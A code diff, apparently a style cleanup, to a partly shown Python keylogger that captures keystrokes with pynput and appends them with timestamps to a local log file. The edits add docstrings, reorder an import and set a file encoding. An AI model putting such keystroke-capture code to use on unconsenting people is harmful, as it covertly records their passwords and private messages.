@@ -1,10 +1,12 @@
-from pynput.keyboard import Key, Listener
+"""Keylogger script created using pynput to log keystrokes and save them to a file"""
 from datetime import datetime
+from pynput.keyboard import Key, Listener
 
 count = 0
 keys = []
 
 def on_press(key):
+    """Handles keyboard events"""
     global keys, count
     if key == Key.backspace:
         if keys:
@@ -34,7 +36,7 @@ def format_key(key):
 
 def write_file(keys, job_id="", delimiter=" "):
     timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    with open("log.txt", "a") as f:
+    with open("log.txt", "a", encoding="utf-8") as f:
         formatted_keys = delimiter.join(format_key(k) for k in keys)
         log_line = f"[{timestamp}] {job_id}:{formatted_keys}\n"
         f.write(log_line)
